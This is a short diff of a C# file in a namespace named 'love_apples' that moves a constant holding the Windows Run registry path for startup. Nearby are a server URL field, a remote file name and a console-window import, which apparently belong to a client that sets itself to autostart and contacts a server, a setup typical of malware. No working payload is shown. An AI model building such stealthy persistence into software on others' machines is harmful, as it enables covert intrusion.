@@ -17,9 +17,9 @@ namespace love_apples
         private static string _basePcName = "";
         private const string ServerUrl = "";
         private const string Version = "2.0";
-        private const string PathRegistryKeyStartup = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
         private const string FileNameOnServer = "alexandria";
         private const bool Debug = true;
+        private const string PathRegistryKeyStartup = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
